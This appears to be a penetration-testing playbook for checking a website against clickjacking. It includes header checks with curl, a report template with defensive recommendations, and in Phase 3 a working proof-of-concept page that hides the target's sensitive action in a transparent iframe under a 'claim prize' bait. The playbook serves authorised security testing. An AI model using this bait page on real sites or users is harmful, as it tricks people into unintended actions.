# Clickjacking (UI Redressing)

## Overview
Clickjacking tricks users into interacting with hidden or framed UI elements.
It happens when applications allow framing without protection.

## Phase 1: Check Headers
```bash
TARGET_URL="https://TARGET"

curl -s -I "$TARGET_URL" \
  | tee /workspace/output/TARGET_clickjacking_headers.txt

rg -n "x-frame-options|content-security-policy" \
  /workspace/output/TARGET_clickjacking_headers.txt \
  > /workspace/output/TARGET_clickjacking_header_signals.txt
```

## Phase 2: CSP Frame-Ancestors Test
```bash
# If CSP is present, verify frame-ancestors
# Example: Content-Security-Policy: frame-ancestors 'self'
```

## Phase 3: PoC Frame Test
```bash
cat > /workspace/output/TARGET_clickjacking_poc.html <<'HTML'
<!doctype html>
<html>
  <body>
    <style>
      iframe { opacity: 0.001; position: absolute; top: 0; left: 0; width: 800px; height: 600px; }
      .bait { position: absolute; top: 50px; left: 50px; z-index: 2; }
    </style>
    <div class="bait">Click here to claim prize</div>
    <iframe src="https://TARGET/sensitive-action"></iframe>
  </body>
</html>
HTML
```

## Phase 4: Validation
```bash
# Open the PoC locally and confirm the target loads in the iframe
# If framing succeeds, clickjacking is possible
```

## Report Template

```
Target: TARGET
Assessment Date: <DATE>

## Confirmed Findings
- [ ] Target allows framing
- [ ] Sensitive action can be clickjacked

## Evidence
- Headers: /workspace/output/TARGET_clickjacking_headers.txt
- PoC: /workspace/output/TARGET_clickjacking_poc.html

## Recommendations
1. Set X-Frame-Options: DENY or SAMEORIGIN
2. Use CSP frame-ancestors with explicit allowlist
3. Add UI confirmation for sensitive actions
```

## Output Files
- `/workspace/output/TARGET_clickjacking_headers.txt` — header check
- `/workspace/output/TARGET_clickjacking_header_signals.txt` — header signals
- `/workspace/output/TARGET_clickjacking_poc.html` — PoC file

indicators: clickjacking, ui redressing, x-frame-options, frame-ancestors
